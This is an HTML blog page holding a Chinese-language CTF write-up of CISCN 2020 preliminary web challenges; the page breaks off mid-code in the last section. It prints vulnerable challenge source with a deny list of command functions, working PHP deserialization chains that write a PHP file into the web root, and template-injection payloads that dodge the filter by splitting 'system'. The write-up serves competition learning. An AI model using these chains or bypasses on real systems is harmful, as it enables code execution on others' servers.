@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>CISCN初赛web总结 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CISCN初赛web总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 24, 2020&nbsp;&nbsp;15:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>又是被大佬带飞的一天</p>
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>父进程调用了pntcl_wait，之后调用pcntl_wifexited，子进程如果异常退出，父进程就会展示phpinfo，用一些disable_functionFuzz了一下a，直接到pfsockopen导致进程异常终止直接输出phpinfo了，Ctrl+f搜索flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/clip_image002.jpg" alt="img"></p>
+<p>大概就是函数造成回调使得进程异常退出，代码就执行phpinfo了，类似的函数还有stream_socket_client</p>
+<h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>dirsearch扫出<a href="http://www.zip，下载源码下来发现是和WMCTF2020" target="_blank" rel="noopener">www.zip，下载源码下来发现是和WMCTF2020</a> webweb一样的框架，代码也没怎么改，所有利用链可以一样，<a href="http://blog.ccreater.top/" target="_blank" rel="noopener">参考</a></p>
+<p>后来传入的时候发现把很多函数都过滤了，最后是想到phpinfo也算函数，再给它传个整数，成功得到phpinfo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=["<span class="title">quotekey</span>"=&gt;"<span class="title">phpinfo</span>"],</span><br><span class="line">            $<span class="title">adhoc</span>=["123"=&gt;["<span class="title">expr</span>"=&gt;""]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span><span class="params">($offset, $value)</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>="";</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">""</span>)),<span class="string">"find"</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看着师傅们的wp分析下应该是预期解的笔记吧</p>
+<p>全局搜索destruct函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824160225.png" alt=""></p>
+<p>跟进write</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162040.png" alt=""></p>
+<p>又调用了Base的write方法，继续跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162233.png" alt=""></p>
+<p>$file和$data都可控，exp:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162555.png" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        $dir = <span class="string">'/var/www/html/'</span>,</span><br><span class="line">        $format = <span class="keyword">self</span>::FORMAT_JSON,</span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">"blacknight.php"</span>=&gt;<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"&lt;?php phpinfo();?&gt;"</span>)),</span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$jig = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure>
+
+<h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class="string">'】'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class="string">'】'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>zzzcms的模改，<a href="https://my.oschina.net/u/3076320/blog/4345639" target="_blank" rel="noopener">参考</a></p>
+<p>parserIfLabel函数应该就是它的魔改，但用原来的payload肯定不行，文件包含函数和命令执行函数过滤了很多，所以我们在{if:assert($_request[phpinfo()])}phpinfo();{end if}的基础上改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125; 失败</span><br><span class="line">&#123;if:assert(phpinfo())&#125;phpinfo();&#123;end if&#125; 失败</span><br><span class="line">&#123;if:phpinfo(123)&#125;phpinfo();&#123;end if&#125;失败</span><br><span class="line">&#123;if:(phpinfo(123))&#125;&#123;end if&#125;失败</span><br><span class="line">&#123;if:(phpinfo)(123)&#125;&#123;end if&#125; 失败</span><br><span class="line">&#123;if:(system)(&#39;ls&#39;)&#125;&#123;end if&#125; 失败</span><br></pre></td></tr></table></figure>
+
+<p>但题中源码是遍历数组元素过滤，我们拼接一下函数不就可以绕过了吗，所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:(&#39;sys&#39;.&#39;tem&#39;)(&#39;ls&#39;)&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112630.png" alt=""></p>
+<p>那么直接读取根目录文件，读取根目录flag即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112709.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112722.png" alt=""></p>
+<h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>直接看路由里的index.js，可以看到得到flag的条件如果是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113109.png" alt=""></p>
+<p>就会直接往服务端发送flag，来看下admin</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113137.png" alt=""></p>
+<p>获得的是环境变量中传入的值，接着往下看有几个方法</p>
+<p>SpawnPoint方法向服务端发送开始指令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113159.png" alt=""></p>
+<p>Privilage方法接受NewAttributeKey和NewAttributeValue，假如为空则重定向，不为空则传入key和value并将他们传到session中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163829.png" alt=""></p>
+<p>再看wp的时候学到了一招，在给了package.json的情况下可以直接运行npm audit命令查看存在的漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163527.png" alt=""></p>
+<p>这里就直接说明了是set-value造成的原型链污染，<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">参考</a></p>
+<p>实践一下，首先开始</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113222.png" alt=""></p>
+<p>创建key和value</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113244.png" alt=""></p>
+<p>检查</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113256.png" alt=""></p>
+<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span 